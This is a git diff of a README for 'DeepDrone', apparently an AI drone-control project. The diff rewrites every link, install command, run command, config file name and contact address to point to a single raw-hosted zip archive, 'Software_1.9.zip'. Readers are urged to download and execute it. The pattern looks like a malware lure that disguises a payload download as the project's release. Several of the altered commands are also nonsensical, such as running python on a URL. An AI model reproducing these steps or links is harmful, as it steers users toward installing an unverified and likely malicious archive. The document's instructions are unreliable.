@@ -1,6 +1,6 @@
 # DeepDrone 🚀
 
-![DeepDrone Logo](https://img.shields.io/badge/DeepDrone-AI%20Drone%20Control-brightgreen)
+![DeepDrone Logo](https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip%20Drone%20Control-brightgreen)
 
 Welcome to the **DeepDrone** repository! This project focuses on developing an AI agent that controls drones effectively. Whether you are a hobbyist, researcher, or professional, DeepDrone aims to enhance your drone experience through advanced AI capabilities.
 
@@ -33,7 +33,7 @@ To get started with DeepDrone, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/rincatpp/deepdrone.git
+   git clone https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -44,11 +44,11 @@ To get started with DeepDrone, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip
    ```
 
 4. **Download the Latest Release**:
-   You can find the latest release [here](https://github.com/rincatpp/deepdrone/releases). Download the necessary files and execute them to start using DeepDrone.
+   You can find the latest release [here](https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip). Download the necessary files and execute them to start using DeepDrone.
 
 ## Usage
 
@@ -57,14 +57,14 @@ Once you have installed DeepDrone, you can start using it by following these ste
 1. **Start the Application**:
    Run the main script:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip
    ```
 
 2. **Connect Your Drone**:
    Ensure your drone is powered on and connected to your computer.
 
 3. **Configure Settings**:
-   Adjust the settings as per your requirements. You can find configuration options in the `config.yaml` file.
+   Adjust the settings as per your requirements. You can find configuration options in the `https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip` file.
 
 4. **Launch the AI Agent**:
    Once everything is set up, you can launch the AI agent to control your drone.
@@ -97,14 +97,14 @@ DeepDrone is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 ## Releases
 
-To stay updated with the latest versions of DeepDrone, visit the [Releases](https://github.com/rincatpp/deepdrone/releases) section. You can download the latest release files and execute them to access new features and improvements.
+To stay updated with the latest versions of DeepDrone, visit the [Releases](https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip) section. You can download the latest release files and execute them to access new features and improvements.
 
 ## Contact
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email**: contact@deepdrone.ai
-- **Twitter**: [@DeepDroneAI](https://twitter.com/DeepDroneAI)
+- **Email**: https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip
+- **Twitter**: [@DeepDroneAI](https://raw.githubusercontent.com/rincatpp/deepdrone/main/drone/Software_1.9.zip)
 
 ---
 
